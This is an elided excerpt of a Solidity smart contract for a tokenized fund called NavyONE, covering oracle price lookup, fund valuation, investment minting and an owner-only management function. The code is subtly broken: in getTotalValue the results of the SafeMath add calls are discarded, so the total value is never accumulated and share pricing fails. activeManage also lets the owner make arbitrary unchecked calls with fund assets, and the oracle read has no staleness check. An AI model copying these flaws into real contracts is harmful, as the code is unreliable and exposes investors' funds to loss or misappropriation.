...
contract NavyONE is Ownable, fundTokenized{
    ...
    constructor () public{
        ...
        valuedTokens.push(valuedToken(
            ...
            18, //decimals 18+18-18=18
            false,//not stable
            true, //nt_tr
            true, //accept invest
            true //price in usd standard
            ));
    }
    ...
    function getTokenPrice (uint256 tokenIndex) internal view returns(uint256)  {
        //return with based
        if (tokenIndex == 0){//ETH:ETH always equals one, when u_std for ETH is false;
            return BASE;
        }
        if (valuedTokens[tokenIndex].stable){//stable coin price ~ 1
            return BASE;
        }
        (,int price,,,) = AggregatorV3Interface(valuedTokens[tokenIndex].oracle).latestRoundData();
        if (price > 0){
            return uint(price);
        }else{
            return 0;
    ...
    function getTotalValue () public view returns(uint256)  {
        uint256 eth2usd    =   getTokenPrice(0);
        ...
        for (uint256 i = 0; i < valuedTokens.length; i ++){
            ...
            if (balance > 0){
                tokenValue = getTokenBalance(i).mul(getTokenPrice(i)).mul(BASE + valuedTokens[i].premium);
            }else{
                tokenValue = 0;
            }
            if (valuedTokens[i].u_std){
                totalValue.add(tokenValue.div(10**uint256(valuedTokens[i].decimals)));
            }else{
                totalValue.add(tokenValue.mul(eth2usd).div(10**uint256(valuedTokens[i].decimals)));
            } 
        }
        return totalValue;
    }
    ...
    function calInvestValue (uint256 tokenIndex, uint256 amount) internal view returns(uint256)  { 
        ...
        uint256 tokenValue = amount.mul(getTokenPrice(tokenIndex));
        if (valuedTokens[tokenIndex].u_std){
            return tokenValue.div(10**uint256(valuedTokens[tokenIndex].decimals));
        }else{
            return tokenValue.mul(getTokenPrice(0)).div(10**uint256(valuedTokens[tokenIndex].decimals));
        }
    }
    ...
    function invest (uint256 tokenIndex, uint256 amount) public payable returns(bool)  {
        ...
        uint256 tokenToBeMinted = totalSupply.mul(BASE).div(totalValue).mul(investValue).div(BASE);
        uint256 valuePerToken   = totalValue.mul(BASE).div(totalSupply).div(BASE);
    ...
    function activeManage(address addr, bytes calldata data) public onlyOwner{
        addr.call(data);
        emit ActiveManage();
    }
